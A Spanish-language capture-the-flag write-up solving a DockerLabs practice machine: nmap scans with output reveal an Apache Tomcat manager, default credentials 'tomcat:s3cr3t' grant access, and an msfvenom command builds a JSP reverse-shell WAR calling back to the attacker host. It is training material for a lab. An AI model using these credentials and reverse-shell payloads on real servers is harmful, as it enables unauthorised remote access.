#MAQUINA #DOCKERLABS #FACIL 
#TOMCAT #MSFVENOM
<hr>

# RECONOCIMIENTO

Vamos a resolver **-Pn** de la plataforma **DockerLabs**.

   ```bash

Máquina desplegada, su dirección IP es --> 172.17.0.2

```

Primero vamos a hacer un escaneo de puertos rápido:

```bash

nmap -sS --min-rate 5000 -vvv -n -Pn -p- 172.17.0.2 --open
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-09 16:41 CET
Initiating ARP Ping Scan at 16:41
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 16:41, 0.05s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 16:41
Scanning 172.17.0.2 [65535 ports]
Discovered open port 8080/tcp on 172.17.0.2
Completed SYN Stealth Scan at 16:41, 0.53s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.0000030s latency).
Scanned at 2024-12-09 16:41:50 CET for 1s
Not shown: 65534 closed tcp ports (reset)
PORT     STATE SERVICE    REASON
8080/tcp open  http-proxy syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.76 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)


```

- **`--open`**: Muestra solo los puertos abiertos en la salida.
- **`-sS`**: Especifica un escaneo TCP SYN, que es más sigiloso que un escaneo de conexión completa.
- **`--min-rate 5000`**: Establece la tasa mínima de paquetes enviados a 5000 por segundo, haciendo que el escaneo sea más rápido.
- **`-vvv`**: Aumenta el nivel de verbosidad, proporcionando una salida más detallada durante el escaneo.
- **`-n`**: No resuelve DNS; esto evita retrasos por búsquedas de nombres.
- **`-Pn`**: Trata el objetivo como si estuviera en línea; omite el descubrimiento de hosts.
- **`-p-`**: Escanea todos los 65535 puertos en lugar de solo los más comunes.

**Conclusiones:** El ttl al ser 64 nos dice que es una máquina **Linux**. Además, vemos que tiene el puerto **8080(HTTP)** abierto.

Ahora vamos a hacer un escaneo con mayor detalle:

   ```bash

nmap -sCV -p8080 172.17.0.2                  
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-09 16:42 CET
Nmap scan report for pressenter.hl (172.17.0.2)
Host is up (0.000016s latency).

PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat 9.0.88
|_http-title: Apache Tomcat/9.0.88
|_http-favicon: Apache Tomcat
MAC Address: 02:42:AC:11:00:02 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.50 seconds



```

   ```bash

nmap --script="http-enum" 172.17.0.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-09 16:42 CET
Nmap scan report for pressenter.hl (172.17.0.2)
Host is up (0.0000030s latency).
Not shown: 999 closed tcp ports (reset)
PORT     STATE SERVICE
8080/tcp open  http-proxy
| http-enum: 
|   /manager/html/upload: Apache Tomcat (401 )
|_  /manager/html: Apache Tomcat (401 )
MAC Address: 02:42:AC:11:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 1.80 seconds

whatweb "http://172.17.0.2:8080/"
http://172.17.0.2:8080/ [200 OK] Country[RESERVED][ZZ], HTML5, IP[172.17.0.2], Title[Apache Tomcat/9.0.88]

```

- **`-sC`**: Realiza un escaneo de scripts (Nmap Scripting Engine, NSE). Esto permite ejecutar scripts de `nmap` para obtener información adicional sobre los servicios detectados, como vulnerabilidades, configuraciones o detalles específicos de los mismos.
- **`-sV`**: Realiza la detección de versiones de servicios. Esto intenta identificar la versión exacta del software que está escuchando en un puerto abierto, lo que puede ayudar a determinar si hay vulnerabilidades conocidas.
- **`--script`**:  Ejecutar un script específico.

# EXPLOTACION

Al revisar la web que hay en el puerto 8080, vemos que no hay nada interesante. Probamos credenciales genéricas de tomcat para entrar al manager: 

   ```bash
tomcat:s3cr3t
```

Estamos dentro del Tomcat Web Application Manager, ahora desplegamos un .war con **msfvenom** (lo creamos) mientras escuchamos por el puerto 443 .

   ```bash
   
	msfvenom -p java/jsp_shell_reverse_tcp --platform linux -a x86 LHOST=172.17.0.1 LPORT=443 -b'/x00/x0a/x0d' EXITFUNC=thread -o payload.war -f war

```

**ESTAMOS COMO ROOT.**

